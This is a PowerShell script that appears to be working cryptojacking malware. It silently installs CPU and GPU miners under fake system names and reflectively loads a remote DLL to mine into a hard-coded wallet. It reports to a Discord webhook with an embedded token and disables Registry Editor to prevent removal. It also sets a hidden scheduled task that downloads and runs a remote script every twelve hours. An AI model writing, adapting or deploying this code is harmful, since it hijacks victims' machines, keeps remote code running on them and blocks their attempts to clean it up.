# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "ultaV2"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$AmdMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Win64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
$Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"

# --- STEALTH SETUP ---
Write-Host "Running..."
$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$CpuZip = Join-Path $StealthDir "update_c.zip"
$GpuZip = Join-Path $StealthDir "update_g.zip"
$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
$GpuExe = Join-Path $StealthDir "win_sys_g.exe"

try {
    $wc = New-Object System.Net.WebClient

    # 1. Handle CPU Miner
    if (-not (Test-Path $CpuExe)) {
        $wc.DownloadFile($MinerUrl, $CpuZip)
        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
        Remove-Item $CpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $CpuExe -Force
    }

    # 2. Detect GPUs (NVIDIA or AMD)
    $NvidiaGpu = $null
    $AmdGpu = $null
    try {
        $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        foreach ($vc in $vcs) {
            if ($vc.Name -match "NVIDIA" -or $vc.PNPDeviceID -match "VEN_10DE") { $NvidiaGpu = $true }
            if ($vc.Name -match "AMD" -or $vc.Name -match "Radeon" -or $vc.PNPDeviceID -match "VEN_1002") { $AmdGpu = $true }
        }
    } catch { }

    if ($NvidiaGpu -and -not (Test-Path $GpuExe)) {
        $wc.DownloadFile($GpuMinerUrl, $GpuZip)
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $GpuExe -Force
    } elseif ($AmdGpu -and -not (Test-Path $GpuExe)) {
        $wc.DownloadFile($AmdMinerUrl, $GpuZip)
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "lolMiner.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $GpuExe -Force
    }

    # --- REFLECTIVE LOADING ---
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetType("DateFundLoader")
    $startMethod = $loader.GetMethod("StartMiner")
    
    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
    $IsAmd = if ($AmdGpu) { "true" } else { "false" }
    $startMethod.Invoke($null, @($CpuExe, $GpuArg, $Wallet, $IsAmd, $Webhook))
    
    # --- PERSISTENCE & AUTO-UPDATE (Scheduled Task for 12h) ---
    # Disable Registry Editor (Regedit) to prevent manual removal
    $RegPolicyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    if (-not (Test-Path $RegPolicyPath)) { New-Item -Path $RegPolicyPath -Force | Out-Null }
    Set-ItemProperty -Path $RegPolicyPath -Name "DisableRegistryTools" -Value 1 -Type DWord

    $TaskName = "WinSysMaintenance"
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    # Add 12-hour repetition to the trigger
    $Trigger.RepetitionInterval = (New-TimeSpan -Hours 12)
    $Trigger.RepetitionDuration = [TimeSpan]::MaxValue

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
    
} catch {
    # Fail silently
}
